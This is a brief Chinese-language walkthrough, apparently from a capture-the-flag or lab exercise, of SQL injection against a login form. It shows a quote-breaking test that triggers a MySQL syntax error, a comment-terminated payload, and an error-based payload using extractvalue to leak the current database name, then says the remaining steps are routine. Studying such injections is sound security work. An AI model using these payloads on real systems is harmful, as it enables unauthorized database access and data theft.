测试

```
admin
1'


出现
Syntax to use near 'admin'' at line 1
报错了


再次注入
admin
1'#
无显示
```



注入

```
admin
1' and extractvalue(1,concat(0x7e,(select database()),0x7e))# 
知道当前数据库为database()
下面注入为一般步骤，不再解释
```

